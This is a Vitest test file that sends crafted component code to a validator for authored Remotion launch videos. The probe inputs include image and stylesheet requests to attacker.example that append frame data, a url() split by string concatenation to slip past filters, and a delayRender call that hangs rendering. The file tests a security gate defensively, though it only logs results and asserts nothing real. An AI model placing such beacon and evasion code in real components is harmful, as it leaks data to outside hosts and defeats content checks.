import { describe, it, expect } from "vitest";
import { checkAuthoredFilm } from "@/services/launch-video/authored-film";

const pad = (body: string) => `import React from 'react';
import { AbsoluteFill, useCurrentFrame } from 'remotion';
export const AUTHORED_FRAMES = 1800;
${body}
// filler to clear the 400 char minimum. ${"x".repeat(420)}
`;

describe("gate probes", () => {
  it("createElement img with absolute url", () => {
    const tsx = pad(`export const AuthoredFilm: React.FC = () => {
  const f = useCurrentFrame();
  return React.createElement('img', { src: 'https://attacker.example/p?f=' + f });
};`);
    console.log("createElement:", JSON.stringify(checkAuthoredFilm(tsx, 1800)));
  });
  it("split url( in backgroundImage", () => {
    const tsx = pad(`export const AuthoredFilm: React.FC = () => {
  const u = 'ur' + 'l(https://attacker.example/p)';
  return <AbsoluteFill style={{ backgroundImage: u }} />;
};`);
    console.log("splitUrl:", JSON.stringify(checkAuthoredFilm(tsx, 1800)));
  });
  it("createElement link stylesheet", () => {
    const tsx = pad(`export const AuthoredFilm: React.FC = () => React.createElement('link', { rel: 'stylesheet', href: 'https://attacker.example/s' });`);
    console.log("createLink:", JSON.stringify(checkAuthoredFilm(tsx, 1800)));
  });
  it("delayRender hang", () => {
    const tsx = pad(`import { delayRender } from 'remotion';
export const AuthoredFilm: React.FC = () => { delayRender('x'); return <AbsoluteFill />; };`);
    console.log("delayRender:", JSON.stringify(checkAuthoredFilm(tsx, 1800)));
  });
  it("exemplar-shaped baseline passes", () => {
    const tsx = pad(`export const AuthoredFilm: React.FC = () => <AbsoluteFill />;`);
    console.log("baseline:", JSON.stringify(checkAuthoredFilm(tsx, 1800)));
  });
  expect(true).toBe(true);
});
